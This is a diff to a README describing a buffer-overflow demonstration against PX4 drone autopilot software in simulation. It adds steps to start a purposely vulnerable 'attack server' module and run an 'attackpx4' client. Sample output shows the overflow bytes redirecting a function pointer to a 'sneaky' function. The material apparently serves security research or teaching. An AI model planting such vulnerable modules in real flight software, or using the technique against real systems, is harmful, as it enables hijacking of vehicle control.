@@ -31,11 +31,53 @@ The server will print if the attack succeeds and will stay in the attacked state
 ### PX4 Example
 Run px4:  
 make px4_sitl jmavsim  
+At the px4 promt type 'attack start' from the command prompt  
+This will start the attack server module and it will be ready to accept client socket buffer overflow attacks.  
+
 Run attack from another terminal:  
 attackpx4  
 Enter the address of the function at the attackpx4 terminal window.  
-A successful attack will run in a lopp until a software refresh of the PX4 process happens.  
+A successful attack will run and there will be a print showing that the attack succeeded. The length of the attack is fixed but can be changed by changing the code in the px4 module.  
 
 
+Here is a typical run with a successful attack on the PX4 side run from one terminal window:
+
+```
+______  __   __    ____
+| ___ \ \ \ / /   /   |
+| |_/ /  \ V /   / /| |
+|  __/   /   \  / /_| |
+| |     / /^\ \ \___  |
+\_|     \/   \/     |_/
+
+attack starting.
+
+Attack Application Starting
+Server Socket created..
+Socket successfully bound..
+Server listening..
+server acccept the client...
+sneaky function addr: 0x5565ead8f420
+regular function addr: 0x5565ead8f410
+calling function pointer at address : 0x5565ead8f200
+function addr: 0x5565ead8f200
+calling function pointer at address : 0x5565ead8f420
+sneaky() function called. Code flow successfully changed.
+
+pxh> 
+
+```
+The client initating the attack from a second terminal window looks like this :
 
 
+```
+./attackpx4 
+Client Socket Created
+connected to the server..
+<N>ormal or <O>verflow run?, <Q> to quit: O
+Answer O
+Overflow
+Function address:0x5565ead8f420
+0x61 0x61 0x61 0x61 0x61 0x61 0x61 0x61 0x61 0x61 0x 0 0x 0 0x55 0x65 0xFFFFFFEA 0xFFFFFFD8 0x20 0xFFFFFFF4 
+
+```
